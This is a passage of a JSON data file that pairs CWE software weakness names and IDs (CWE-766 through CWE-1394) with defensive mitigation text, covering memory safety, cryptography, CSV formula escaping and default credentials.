      "::PHASE:Implementation:DESCRIPTION:When utilizing pointer arithmetic to traverse a buffer, use a separate variable to track progress through memory and preserve the originally allocated address for later freeing.::PHASE:Implementation:DESCRIPTION:When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, glibc in Linux provides protection against free of invalid pointers.::PHASE:Architecture and Design:DESCRIPTION:Use a language that provides abstractions for memory allocation and deallocation.::PHASE:Testing:DESCRIPTION:Use a tool that dynamically detects memory management problems, such as valgrind.::"
    ],
    [
      "critical data element declared public",
      "CWE-766",
      "::PHASE:Implementation:DESCRIPTION:Data should be private, static, and final whenever possible. This will assure that your code is protected by instantiating early, preventing access, and preventing tampering.::"
    ],
    [
      "missing reference to active file descriptor or handle",
      "CWE-773",
      "::PHASE:Operation Architecture and Design:STRATEGY:Resource Limitation:DESCRIPTION:Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems. When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users. Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).::"
    ],
    [
      "use of path manipulation function without maximum-sized buffer",
      "CWE-785",
      "::PHASE:Implementation:DESCRIPTION:Always specify output buffers large enough to handle the maximum-size possible result from path manipulation functions.::"
    ],
    [
      "access of memory location before start of buffer",
      "CWE-786",
      ""
    ],
    [
      "access of memory location after end of buffer",
      "CWE-788",
      ""
    ],
    [
      "memory allocation with excessive size value",
      "CWE-789",
      "::PHASE:Implementation Architecture and Design:DESCRIPTION:Perform adequate input validation against any value that influences the amount of memory that is allocated. Define an appropriate strategy for handling requests that exceed the limit, and consider supporting a configuration option so that the administrator can extend the amount of memory to be used if necessary.::PHASE:Operation:DESCRIPTION:Run your program using system-provided resource limits for memory. This might still cause the program to crash or exit, but the impact to the rest of the system will be minimized.::"
    ],
    [
      "only filtering one instance of a special element",
      "CWE-793",
      ""
    ],
    [
      "buffer access with incorrect length value",
      "CWE-805",
      "::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer. Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Consider adhering to the following rules when allocating and managing an application's memory: Double check that the buffer is as large as specified. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space. If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the product or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::"
    ],
    [
      "buffer access using size of source buffer",
      "CWE-806",
      "::PHASE:Architecture and Design:DESCRIPTION:Use an abstraction library to abstract away risky APIs. Examples include the Safe C String Library (SafeStr) by Viega, and the Strsafe.h library from Microsoft. This is not a complete solution, since many buffer overflows are not related to strings.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Programmers should adhere to the following rules when allocating and managing their applications memory: Double check that your buffer is as large as you specify. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if calling this function in a loop and make sure there is no danger of writing past the allocated space. Truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Build and Compilation Operation:DESCRIPTION:Most mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution.::"
    ],
    [
      "use of out-of-range pointer offset",
      "CWE-823",
      ""
    ],
    [
      "signal handler function associated with multiple signals",
      "CWE-831",
      ""
    ],
    [
      "unlock of a resource that is not locked",
      "CWE-832",
      ""
    ],
    [
      "use of expired file descriptor",
      "CWE-910",
      ""
    ],
    [
      "improper neutralization of special elements in data query logic",
      "CWE-943",
      ""
    ],
    [
      "use of redundant code",
      "CWE-1041",
      "::PHASE:Implementation:DESCRIPTION:Merge common functionality into a single function and then call that function from across the entire code base.::"
    ],
    [
      "static member data element outside of a singleton class element",
      "CWE-1042",
      ""
    ],
    [
      "data element aggregating an excessively large number of non-primitive elements",
      "CWE-1043",
      ""
    ],
    [
      "parent class with a virtual destructor and a child class without a virtual destructor",
      "CWE-1045",
      ""
    ],
    [
      "invokable control element with large number of outward calls",
      "CWE-1048",
      ""
    ],
    [
      "excessive data query operations in a large data table",
      "CWE-1049",
      ""
    ],
    [
      "parent class with references to child class",
      "CWE-1062",
      ""
    ],
    [
      "creation of class instance within a static code block",
      "CWE-1063",
      ""
    ],
    [
      "empty exception block",
      "CWE-1069",
      "::PHASE:Implementation:DESCRIPTION:For every exception block add code that handles the specific exception in the way intended by the application.::"
    ],
    [
      "empty code block",
      "CWE-1071",
      ""
    ],
    [
      "source code file with excessive number of lines of code",
      "CWE-1080",
      ""
    ],
    [
      "invokable control element with excessive volume of commented-out code",
      "CWE-1085",
      ""
    ],
    [
      "class with excessive number of child classes",
      "CWE-1086",
      ""
    ],
    [
      "class with virtual method without a virtual destructor",
      "CWE-1087",
      ""
    ],
    [
      "large data table with excessive number of indices",
      "CWE-1089",
      ""
    ],
    [
      "reliance on runtime component in generated code",
      "CWE-1101",
      ""
    ],
    [
      "excessive use of self-modifying code",
      "CWE-1123",
      ""
    ],
    [
      "use of prohibited code",
      "CWE-1177",
      ""
    ],
    [
      "initialization of a resource with an insecure default",
      "CWE-1188",
      ""
    ],
    [
      "failure to disable reserved bits",
      "CWE-1209",
      "::PHASE:Architecture and Design Implementation:DESCRIPTION:Include a feature to disable reserved bits.::PHASE:Integration:DESCRIPTION:Any writes to these reserve bits are blocked (e.g., ignored, access-protected, etc.), or an exception can be asserted.::"
    ],
    [
      "incorrect use of autoboxing and unboxing for performance critical operations",
      "CWE-1235",
      "::PHASE:Implementation:DESCRIPTION:Use of boxed primitives should be limited to certain situations such as when calling methods with typed parameters. Examine the use of boxed primitives prior to use. Use SparseArrays or ArrayMap instead of HashMap to avoid performance overhead.::"
    ],
    [
      "improper neutralization of formula elements in a csv file",
      "CWE-1236",
      "::PHASE:Implementation:DESCRIPTION:When generating CSV output, ensure that formula-sensitive metacharacters are effectively escaped or removed from all data before storage in the resultant CSV. Risky characters include '=' (equal), '+' (plus), '-' (minus), and '@' (at).:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:If a field starts with a formula character, prepend it with a ' (single apostrophe), which prevents Excel from executing the formula.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:DESCRIPTION:Certain implementations of spreadsheet software might disallow formulas from executing if the file is untrusted, or if the file is not authored by the current user.:EFFECTIVENESS:Limited::"
    ],
    [
      "use of a cryptographic primitive with a risky implementation",
      "CWE-1240",
      "::PHASE:Requirements:DESCRIPTION:Require compliance with the strongest-available recommendations from trusted parties, and require that compliance must be kept up-to-date, since recommendations evolve over time. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Ensure that the architecture/design uses the strongest-available primitives and algorithms from trusted parties. For example, US government systems require FIPS 140-3 certification, which supersedes FIPS 140-2 [REF-1192] [REF-1226].:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. As with all cryptographic mechanisms, the source code should be available for analysis. If the algorithm may be compromised when attackers find out how it works, then it is especially weak.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:DESCRIPTION:Try not to use cryptographic algorithms in novel ways or with new modes of operation even when you know it is secure. For example, using SHA-2 chaining to create a 1-time pad for encryption might sound like a good idea, but one should not do this.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:DESCRIPTION:Ensure that the design can replace one cryptographic primitive or algorithm with another in the next generation (cryptographic agility). Where possible, use wrappers to make the interfaces uniform. This will make it easier to upgrade to stronger algorithms. This is especially important for hardware, which can be more difficult to upgrade quickly than software; design the hardware at a replaceable block level.:EFFECTIVENESS:Defense in Depth::PHASE:Architecture and Design:DESCRIPTION:Do not use outdated or non-compliant cryptography algorithms. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong [REF-267].:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not use a linear-feedback shift register (LFSR) or other legacy methods as a substitute for an accepted and standard Random Number Generator.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not use a checksum as a substitute for a cryptographically generated hash.:EFFECTIVENESS:Discouraged Common Practice::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted cryptographic library or framework. Industry-standard implementations will save development time and are more likely to avoid errors that can occur during implementation of cryptographic algorithms. However, the library/framework could be used incorrectly during implementation.:EFFECTIVENESS:High::PHASE:Architecture and Design Implementation:DESCRIPTION:When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for the prevention of common attacks.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not store keys in areas accessible to untrusted agents. Carefully manage and protect the cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography algorithm is irrelevant.:EFFECTIVENESS:Moderate::"
    ],
    [
      "uninitialized value on reset for registers holding security settings",
      "CWE-1271",
      "::PHASE:Implementation:DESCRIPTION:Design checks should be performed to identify any uninitialized flip-flops used for security-critical functions.::PHASE:Architecture and Design:DESCRIPTION:All registers holding security-critical information should be set to a specific value on reset.::"
    ],
    [
      "assumed-immutable data is stored in writable memory",
      "CWE-1282",
      "::PHASE:Implementation:DESCRIPTION:All immutable code or data should be programmed into ROM or write-once memory.::"
    ],
    [
      "use of blocking code in single-threaded, non-blocking context",
      "CWE-1322",
      "::PHASE:Implementation:DESCRIPTION:Generally speaking, blocking calls should be replaced with non-blocking alternatives that can be used asynchronously. Expensive computations should be passed off to worker threads, although the correct approach depends on the framework being used.::PHASE:Implementation:DESCRIPTION:For expensive computations, consider breaking them up into multiple smaller computations. Refer to the documentation of the framework being used for guidance.::"
    ],
    [
      "binding to an unrestricted ip address",
      "CWE-1327",
      "::PHASE:System Configuration:DESCRIPTION:Assign IP addresses that are not 0.0.0.0.:EFFECTIVENESS:High::PHASE:System Configuration:STRATEGY:Firewall:DESCRIPTION:Unwanted connections to the configured server may be denied through a firewall or other packet filtering measures.:EFFECTIVENESS:High::"
    ],
    [
      "security version number mutable to older versions",
      "CWE-1328",
      "::PHASE:Architecture and Design:DESCRIPTION:When architecting the system, security version data should be designated for storage in registers that are either read-only or have access controls that prevent modification by an untrusted agent.::PHASE:Implementation:DESCRIPTION:During implementation and test, security version data should be demonstrated to be read-only and access controls should be validated.::"
    ],
    [
      "insufficient precision or accuracy of a real number",
      "CWE-1339",
      "::PHASE:Implementation Patching and Maintenance:DESCRIPTION:The developer or maintainer can move to a more accurate representation of real numbers. In extreme cases, the programmer can move to representations such as ratios of BigInts which can represent real numbers to extremely fine precision. The programmer can also use the concept of an Unum real. The memory and CPU tradeoffs of this change must be examined. Since floating point reals are used in many products and many locations, they are implemented in hardware and most format changes will cause the calculations to be moved into software resulting in slower products.::"
    ],
    [
      "use of default credentials",
      "CWE-1392",
      "::PHASE:Requirements:DESCRIPTION:Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Force the administrator to change the credential upon installation.:EFFECTIVENESS:High::PHASE:Installation Operation:DESCRIPTION:The product administrator could change the defaults upon installation or during operation.:EFFECTIVENESS:Moderate::"
    ],
    [
      "use of default password",
      "CWE-1393",
      "::PHASE:Requirements:DESCRIPTION:Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.:EFFECTIVENESS:High::PHASE:Documentation:DESCRIPTION:Ensure that product documentation clearly emphasizes the presence of default passwords and provides steps for the administrator to change them.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:DESCRIPTION:Force the administrator to change the credential upon installation.:EFFECTIVENESS:High::PHASE:Installation Operation:DESCRIPTION:The product administrator could change the defaults upon installation or during operation.:EFFECTIVENESS:Moderate::"
    ],
    [
      "use of default cryptographic key",
      "CWE-1394",
      "::PHASE:Requirements:DESCRIPTION:Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Force the administrator to change the credential upon installation.:EFFECTIVENESS:High::PHASE:Installation Operation:DESCRIPTION:The product administrator could change the defaults upon installation or during operation.:EFFECTIVENESS:Moderate::"
    ]
  ]
}